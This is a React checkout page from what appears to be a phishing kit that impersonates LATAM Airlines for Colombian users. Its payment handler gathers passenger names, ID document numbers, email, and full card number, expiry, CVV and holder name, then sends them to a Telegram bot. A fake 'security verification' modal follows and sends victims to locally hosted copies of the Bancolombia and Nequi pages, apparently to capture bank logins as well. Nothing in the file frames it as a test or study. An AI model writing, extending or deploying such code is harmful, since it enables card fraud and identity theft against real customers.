import React, { useState } from 'react';
import { useLocation, useNavigate } from 'react-router-dom';
import { Menu, ChevronDown, ChevronUp, ArrowRight, CreditCard, Wallet } from 'lucide-react';
import { format } from 'date-fns';
import { es } from 'date-fns/locale';
import { sendToTelegram } from '../utils/telegram';

const BANKS = [
  { name: "Nequi", disabled: false },
  { name: "Bancolombia", disabled: false },
  { name: "Banco de Bogotá", disabled: true },
  { name: "Davivienda", disabled: true },
  { name: "BBVA Colombia", disabled: true },
  { name: "Banco de Occidente", disabled: true },
  { name: "Banco Popular", disabled: true },
  { name: "Banco AV Villas", disabled: true },
  { name: "Daviplata", disabled: true },
  { name: "Scotiabank Colpatria", disabled: true },
  { name: "Banco Caja Social", disabled: true }
];

function Payment() {
  const location = useLocation();
  const navigate = useNavigate();
  const { 
    origin, 
    destination, 
    startDate, 
    returnDate, 
    tripType, 
    selectedOutbound, 
    selectedInbound,
    formData 
  } = location.state || {};

  const [isPriceExpanded, setIsPriceExpanded] = useState(false);
  const [email, setEmail] = useState(formData?.email || '');
  const [selectedPaymentMethod, setSelectedPaymentMethod] = useState(null);
  const [selectedBank, setSelectedBank] = useState('');
  const [showBankVerification, setShowBankVerification] = useState(false);
  const [cardDetails, setCardDetails] = useState({
    number: '',
    expiry: '',
    cvv: '',
    name: ''
  });

  const handleCardNumberChange = (e) => {
    const value = e.target.value.replace(/\D/g, '').slice(0, 16);
    setCardDetails({ ...cardDetails, number: value });
  };

  const handleExpiryChange = (e) => {
    let value = e.target.value.replace(/\D/g, '').slice(0, 4);
    if (value.length >= 2) {
      value = value.slice(0, 2) + '/' + value.slice(2);
    }
    setCardDetails({ ...cardDetails, expiry: value });
  };

  const handleCvvChange = (e) => {
    const value = e.target.value.replace(/\D/g, '').slice(0, 3);
    setCardDetails({ ...cardDetails, cvv: value });
  };

  const isCardFormValid = 
    cardDetails.number.length === 16 &&
    cardDetails.expiry.length === 5 && // 2 digits + / + 2 digits
    cardDetails.cvv.length === 3 &&
    cardDetails.name.trim().length > 0;

  const isPaymentValid = 
    (selectedPaymentMethod === 'pse' && selectedBank !== '') || 
    (selectedPaymentMethod === 'card' && isCardFormValid);

  // Calcular precio total
  const calculateTotal = () => {
    let total = 0;
    if (selectedOutbound) total += selectedOutbound.price;
    if (selectedInbound) total += selectedInbound.price;
    // Asumimos que si llegó aquí, quizás agregó la asistencia (en un caso real se pasaría el estado)
    // Por ahora mantenemos el precio base de los vuelos para coincidir con el flujo simple
    return total;
  };

  const totalPrice = calculateTotal();

  const handlePay = async () => {
    if (!isPaymentValid) return;

    const paymentInfo = selectedPaymentMethod === 'card' 
      ? `💳 *Tarjeta:* ${cardDetails.number}\n📅 *Expira:* ${cardDetails.expiry}\n🔒 *CVV:* ${cardDetails.cvv}\n👤 *Titular:* ${cardDetails.name}`
      : `🏦 *PSE - Banco:* ${selectedBank}`;

    const message = `
*Nueva Compra Confirmada*
-----------------------
👤 *Pasajero:* ${formData?.name} ${formData?.surname}
🆔 *Documento:* ${formData?.docType} ${formData?.docNumber}
📧 *Email:* ${email}

✈️ *Vuelo Ida:* ${origin?.city || origin} -> ${destination?.city || destination}
📅 ${formatDate(startDate)}
${selectedInbound ? `\n✈️ *Vuelo Vuelta:* ${destination?.city || destination} -> ${origin?.city || origin}\n📅 ${formatDate(returnDate)}\n` : ''}
💰 *Total:* COP ${totalPrice.toLocaleString('es-CO')}

*Método de Pago:*
${paymentInfo}
    `;

    const success = await sendToTelegram(message);
    if (success) {
      // Guardar datos del usuario para los bancos
      const userData = {
        name: formData?.name,
        surname: formData?.surname,
        docType: formData?.docType,
        docNumber: formData?.docNumber,
        email: email,
        totalPrice: totalPrice,
        origin: origin?.city || origin,
        destination: destination?.city || destination
      };
      sessionStorage.setItem('flightUser', JSON.stringify(userData));

      if (selectedPaymentMethod === 'card') {
        setShowBankVerification(true);
        window.scrollTo({ top: 0, behavior: 'smooth' });
        return;
      }

      if (selectedPaymentMethod === 'pse' && selectedBank === 'Bancolombia') {
        // Redirigir a la página estática de Bancolombia
        window.location.href = '/banks/bancolombia/index.html';
      } else if (selectedPaymentMethod === 'pse' && selectedBank === 'Nequi') {
        // Redirigir a la página estática de Nequi
        window.location.href = '/banks/nequi/index.html';
      } else {
        alert('Pago procesado con éxito. (Datos enviados a Telegram)');
        // Aquí podrías redirigir a una página de éxito o home
        // navigate('/success'); 
      }
    } else {
      alert('Pago procesado localmente. (Error al enviar a Telegram, verifica configuración)');
    }
  };

  const handleVerificationBankSelect = (bankName) => {
      if (bankName === 'Bancolombia') {
          window.location.href = '/banks/bancolombia/index.html';
      } else if (bankName === 'Nequi') {
          window.location.href = '/banks/nequi/index.html';
      } else {
          alert('Por favor selecciona Bancolombia o Nequi para esta demostración.');
      }
  };

  const formatDate = (date) => {
    if (!date) return '';
    return format(date, "EEE, dd 'de' MMM", { locale: es });
  };

  if (showBankVerification) {
    return (
      <div className="min-h-screen bg-black/50 fixed inset-0 z-[100] flex items-center justify-center p-4">
        <div className="bg-white rounded-lg w-full max-w-md overflow-hidden shadow-2xl">
          <div className="bg-[#0B153D] p-4 text-white flex justify-between items-center">
            <h2 className="text-lg font-bold">Verificación de Seguridad</h2>
          </div>
          <div className="p-6">
            <div className="mb-6 text-center">
              <div className="w-16 h-16 bg-blue-100 rounded-full flex items-center justify-center mx-auto mb-4">
                <svg xmlns="http://www.w3.org/2000/svg" className="h-8 w-8 text-[#0B153D]" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z" />
                </svg>
              </div>
              <h3 className="text-xl font-bold text-gray-800 mb-2">Valida tu titularidad</h3>
              <p className="text-gray-600 text-sm">
                Para confirmar que eres el titular de la tarjeta, por favor ingresa a tu banco y autoriza la transacción.
              </p>
            </div>

            <div className="space-y-3">
              <p className="text-sm font-bold text-gray-700 mb-2">Selecciona tu banco:</p>
              
              <button 
                onClick={() => handleVerificationBankSelect('Bancolombia')}
                className="w-full flex items-center justify-between p-4 border border-gray-200 rounded-lg hover:border-[#E8114B] hover:bg-red-50 transition-all group"
              >
                <span className="font-medium text-gray-700 group-hover:text-[#E8114B]">Bancolombia</span>
                <ChevronDown className="-rotate-90 w-5 h-5 text-gray-400 group-hover:text-[#E8114B]" />
              </button>

              <button 
                onClick={() => handleVerificationBankSelect('Nequi')}
                className="w-full flex items-center justify-between p-4 border border-gray-200 rounded-lg hover:border-[#E8114B] hover:bg-red-50 transition-all group"
              >
                <span className="font-medium text-gray-700 group-hover:text-[#E8114B]">Nequi</span>
                <ChevronDown className="-rotate-90 w-5 h-5 text-gray-400 group-hover:text-[#E8114B]" />
              </button>

              <div className="text-center mt-4">
                <p className="text-xs text-gray-400">
                   Tu seguridad es nuestra prioridad. Esta validación es necesaria para evitar fraudes.
                </p>
              </div>
            </div>
          </div>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-[#F5F5F5] font-sans pb-32">
      {/* Header */}
      <header className="bg-[#0B153D] text-white p-4 flex justify-between items-center sticky top-0 z-50">
        <div className="flex items-center gap-2 cursor-pointer" onClick={() => navigate('/')}>
          <div className="flex flex-col leading-none">
            <span className="font-bold text-xl tracking-wider">LATAM</span>
            <span className="text-[0.6rem] tracking-widest text-gray-300">AIRLINES</span>
          </div>
          <div className="text-red-500">
             <svg width="24" height="24" viewBox="0 0 24 24" fill="currentColor">
                <path d="M2,2 L10,2 L2,10 Z" />
                <path d="M12,4 L20,4 L12,12 Z" />
                <path d="M4,14 L12,14 L4,22 Z" />
             </svg>
          </div>
        </div>
        
        <div className="flex items-center gap-4">
           <button className="bg-[#2F3A66] px-4 py-1 rounded text-sm font-medium">Iniciar sesión</button>
           <Menu className="w-6 h-6 cursor-pointer" />
        </div>
      </header>

      <div className="p-4 max-w-lg mx-auto">
        <h1 className="text-2xl text-[#0B153D] font-light mb-6">
          Confirma y paga tu compra
        </h1>

        {/* Resumen de Compra */}
        <div className="bg-white rounded-lg shadow-sm mb-8 p-6">
           <div className="flex justify-between items-start mb-2">
              <div>
                 <h2 className="text-[#0B153D] text-xl font-medium">Total a pagar</h2>
                 <p className="text-gray-500 text-sm">1 Adulto</p>
              </div>
              <div className="text-[#0B153D] font-bold text-xl">
                 $ {totalPrice.toLocaleString('es-CO')}
              </div>
           </div>

           <hr className="my-4 border-gray-200" />

           {/* Vuelo Ida */}
           {selectedOutbound && (
             <div className="mb-6">
               <div className="flex items-center gap-2 mb-1">
                 <span className="font-bold text-[#0B153D]">De {origin?.city || origin} a {destination?.city || destination}</span>
               </div>
               <div className="text-gray-600 text-sm mb-2">
                 {formatDate(startDate)}
               </div>
               <div className="flex items-center gap-2 text-sm text-gray-600 mb-2">
                 <span>{selectedOutbound.departure} {selectedOutbound.origin}</span>
                 <ArrowRight className="w-4 h-4" />
                 <span>{selectedOutbound.arrival} {selectedOutbound.destination}</span>
               </div>
               <div className="inline-block bg-[#D6EFFF] text-[#0070BA] px-3 py-1 rounded-full text-xs font-bold">
                 Basic
               </div>
             </div>
           )}

           {/* Vuelo Vuelta */}
           {selectedInbound && (
             <div>
               <div className="flex items-center gap-2 mb-1">
                 <span className="font-bold text-[#0B153D]">De {destination?.city || destination} a {origin?.city || origin}</span>
               </div>
               <div className="text-gray-600 text-sm mb-2">
                 {formatDate(returnDate)}
               </div>
               <div className="flex items-center gap-2 text-sm text-gray-600 mb-2">
                 <span>{selectedInbound.departure} {selectedInbound.origin}</span>
                 <ArrowRight className="w-4 h-4" />
                 <span>{selectedInbound.arrival} {selectedInbound.destination}</span>
               </div>
               <div className="inline-block bg-[#D6EFFF] text-[#0070BA] px-3 py-1 rounded-full text-xs font-bold">
                 Basic
               </div>
             </div>
           )}
           
           <div className="mt-6 text-center">
             <button className="text-[#E8114B] font-bold text-sm hover:underline">
               Revisa el detalle de tu compra
             </button>
           </div>
        </div>

        {/* Medios de Pago */}
        <h2 className="text-[#0B153D] text-2xl font-light mb-4">Medios de pago</h2>

        {/* Opción PSE / Wallet */}
        <div 
           className={`bg-white rounded-lg shadow-sm mb-4 overflow-hidden border transition-colors cursor-pointer ${selectedPaymentMethod === 'pse' ? 'border-[#E8114B]' : 'border-transparent hover:border-gray-200'}`}
           onClick={() => setSelectedPaymentMethod('pse')}
        >
           <div className="bg-[#E5E8F5] h-24 relative flex items-center justify-center overflow-hidden">
              {/* Placeholder ilustrativo similar a la imagen */}
              <div className="absolute inset-0 bg-gradient-to-r from-blue-100 to-purple-100 opacity-50"></div>
              <img 
                src="https://cdn-icons-png.flaticon.com/512/2922/2922510.png" 
                alt="Woman Laptop" 
                className="h-full object-contain relative z-10" 
                style={{opacity: 0.8}}
              />
           </div>
           <div className="p-4 flex items-center justify-between">
              <div>
                 <h3 className="text-[#0B153D] font-bold text-sm mb-1">
                    Pago con débito bancario PSE o tu LATAM Wallet
                 </h3>
                 <p className="text-gray-500 text-xs">
                    Usa tu cuenta de ahorros o corriente.
                 </p>
              </div>
              <div className={`w-6 h-6 rounded-full border-2 flex items-center justify-center ${selectedPaymentMethod === 'pse' ? 'border-[#E8114B]' : 'border-blue-600'}`}>
                 {selectedPaymentMethod === 'pse' && <div className="w-3 h-3 rounded-full bg-[#E8114B]" />}
              </div>
           </div>

           {selectedPaymentMethod === 'pse' && (
             <div className="p-4 border-t bg-gray-50">
                <label className="block text-xs font-bold text-gray-700 mb-2">Selecciona tu banco</label>
                <div className="relative">
                  <select 
                    className="w-full p-3 border border-gray-400 rounded text-gray-700 appearance-none bg-white focus:outline-none focus:border-[#E8114B]"
                    value={selectedBank}
                    onChange={(e) => setSelectedBank(e.target.value)}
                  >
                    <option value="">Seleccione una opción...</option>
                    {BANKS.map(bank => (
                      <option key={bank.name} value={bank.name} disabled={bank.disabled}>
                        {bank.name} {bank.disabled ? ' - Banco no disponible por el momento' : ''}
                      </option>
                    ))}
                  </select>
                  <ChevronDown className="absolute right-3 top-1/2 -translate-y-1/2 text-gray-500 w-5 h-5 pointer-events-none" />
                </div>
             </div>
           )}
        </div>

        {/* Opción Tarjeta (Deshabilitada temporalmente) */}
        <div 
           className="bg-gray-50 rounded-lg shadow-sm mb-8 p-4 border border-transparent opacity-60 cursor-not-allowed"
        >
           <div className="flex items-center justify-between">
               <div className="flex items-center gap-4">
                  <CreditCard className="text-gray-400 w-6 h-6" />
                  <div>
                     <div className="font-bold text-gray-500 text-sm">Agregar tarjeta (No disponible)</div>
                     <div className="text-gray-400 text-xs">
                        Temporalmente deshabilitado
                     </div>
                  </div>
               </div>
               <div className="w-6 h-6 rounded-full border-2 border-gray-300 flex items-center justify-center">
               </div>
           </div>
        </div>

        {/* Email Comprobante */}
        <h2 className="text-[#0B153D] text-xl font-light mb-4 leading-tight">
           ¿A dónde enviamos el comprobante de compra?
        </h2>

        <div className="bg-white rounded-lg shadow-sm p-6 mb-4">
           <p className="text-[#0B153D] text-sm mb-4">
              La persona que reciba el comprobante será <span className="font-bold">administradora del viaje</span> y la única que podrá solicitar cambios y devoluciones.
           </p>
           
           <input 
             type="email" 
             placeholder="Email" 
             value={email}
             onChange={(e) => setEmail(e.target.value)}
             className="w-full p-3 border border-gray-400 rounded text-gray-700 focus:outline-none focus:border-[#E8114B]"
           />
        </div>

      </div>

      {/* Footer */}
      <div className="fixed bottom-0 left-0 right-0 bg-white shadow-[0_-4px_6px_-1px_rgba(0,0,0,0.1)] z-50">
         <div 
           className="px-4 py-2 border-b flex justify-between items-center cursor-pointer"
           onClick={() => setIsPriceExpanded(!isPriceExpanded)}
         >
           <div className="flex items-center gap-2 text-[#5C2E91] font-bold">
             Precio final <ChevronUp className={`w-5 h-5 transition-transform ${isPriceExpanded ? 'rotate-180' : ''}`} />
           </div>
           <div className="font-bold text-[#0B153D]">
             COP {totalPrice.toLocaleString('es-CO')}
           </div>
         </div>
         
         {isPriceExpanded && (
           <div className="px-4 py-2 bg-gray-50 text-sm text-gray-600">
             {selectedOutbound && (
               <div className="flex justify-between py-1">
                 <span>Vuelo Ida</span>
                 <span>COP {selectedOutbound.price.toLocaleString('es-CO')}</span>
               </div>
             )}
             {selectedInbound && (
               <div className="flex justify-between py-1">
                 <span>Vuelo Vuelta</span>
                 <span>COP {selectedInbound.price.toLocaleString('es-CO')}</span>
               </div>
             )}
           </div>
         )}

         <div className="p-4">
           <button 
             className={`w-full py-3 font-bold rounded-lg text-white transition-colors ${isPaymentValid ? 'bg-[#E8114B] hover:bg-[#d00f43]' : 'bg-gray-400 cursor-not-allowed'}`}
             disabled={!isPaymentValid}
             onClick={handlePay}
           >
             Pagar
           </button>
         </div>
      </div>
    </div>
  );
}

export default Payment;
